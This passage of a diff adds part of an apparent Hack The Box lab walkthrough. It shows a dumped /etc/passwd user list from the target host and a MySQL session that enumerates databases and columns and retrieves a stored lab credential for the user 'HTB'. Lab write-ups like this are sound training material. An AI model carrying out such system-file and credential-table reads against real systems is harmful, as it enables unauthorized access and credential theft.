+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+tom:x:1002:1002:,,,:/home/tom:/bin/bash
+dovecot:x:113:120:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:115:121:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
+tom@NIXHARD:~/Maildir$ 
+
+
+```
+
+We can connect to mysql:
+
+```shell
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use users
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------+
+| Tables_in_users |
++-----------------+
+| users           |
++-----------------+
+1 row in set (0.00 sec)
+
+mysql> show columns from users;
++----------+-------------+------+-----+---------+-------+
+| Field    | Type        | Null | Key | Default | Extra |
++----------+-------------+------+-----+---------+-------+
+| id       | int         | YES  |     | NULL    |       |
+| username | varchar(50) | YES  |     | NULL    |       |
+| password | varchar(50) | YES  |     | NULL    |       |
++----------+-------------+------+-----+---------+-------+
+3 rows in set (0.00 sec)
+
+mysql> SELECT * FROM users WHERE username LIKE "HTB";
++------+----------+------------------------------+
+| id   | username | password                     |
++------+----------+------------------------------+
+|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
++------+----------+------------------------------+
+1 row in set (0.00 sec)
+
+mysql> 
+
+```
 
